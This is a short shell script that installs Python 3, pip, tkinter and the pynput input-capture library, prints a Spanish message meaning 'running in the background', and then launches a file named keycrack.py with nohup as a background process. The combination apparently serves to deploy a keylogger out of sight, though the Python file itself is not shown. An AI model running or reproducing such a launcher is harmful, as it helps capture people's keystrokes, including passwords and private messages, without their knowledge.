apt -y install python3
apt -y install python3-pip
apt -y install python3-tk
pip install pynput
echo "EJECUTANDO EN SEGUNDO PLANO"
nohup python3 keycrack.py &
